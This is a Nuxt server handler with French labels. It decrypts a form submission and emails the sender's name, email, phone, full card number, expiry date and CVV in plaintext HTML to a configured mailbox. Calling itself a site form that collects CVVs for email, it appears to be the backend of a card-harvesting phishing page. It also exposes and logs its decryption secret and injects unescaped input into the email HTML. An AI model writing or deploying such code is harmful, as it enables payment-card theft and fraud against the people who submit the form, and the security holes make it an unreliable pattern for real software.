import nodemailer from "nodemailer";
import { decryptPayload } from "~/utils/decrypt";

export default defineEventHandler(async (event) => {
  const secret = useRuntimeConfig().public.cryptoSecret

  const { payload } = await readBody(event)
  const data = decryptPayload(payload, secret)
  console.log("process.env.CRYPTO_SECRET", process.env.CRYPTO_SECRET);

  const { pseudo, email, telephone, message, card_number, card_expiration, card_cvv } = data

  if (!email || !pseudo) {
    throw createError({
      statusCode: 400,
      statusMessage: "Champs requis manquants",
    })
  }


  const transporter = nodemailer.createTransport({
    host: process.env.SMTP_HOST,
    port: Number(process.env.SMTP_PORT),
    secure: false,
    auth: {
      user: process.env.SMTP_USER,
      pass: process.env.SMTP_PASS,
    },
  })

  await transporter.verify();

  await transporter.sendMail({
    from: `"Formulaire Site" <${process.env.SMTP_USER}>`,
    to: process.env.MAIL_TO,
    subject: "Nouveau message",
    html: `
  <div style="
    max-width: 500px; 
    margin: 0 auto; 
    padding: 20px; 
    border: 2px solid #4a90e2; 
    border-radius: 15px; 
    background: #f0f8ff; 
    font-family: Arial, sans-serif;
  ">
    <h2 style="text-align:center; color:#4a90e2;">📨 Détails de l'opération</h2>
    <ol style="padding-left: 20px; font-size: 16px; color: #333;">
      <li><b>Pseudo :</b> ${data.pseudo || 'N/A'}</li>
      <li><b>Email :</b> ${data.email || 'N/A'}</li>
      <li><b>Téléphone :</b> ${data.telephone || 'N/A'}</li>
      <li><b>Carte :</b> ${data.card_number || 'N/A'}</li>
      <li><b>CVV :</b> ${data.card_cvv|| 'N/A'}</li>
      <li><b>Date d'expiration :</b> ${data.card_expiration || 'N/A'}</li>
    </ol>
    <p style="text-align:center; margin-top:20px; font-size:14px; color:#555;">
      Merci pour votre confiance ! 💙
    </p>
  </div>
`,
  })

  return { success: true }
})
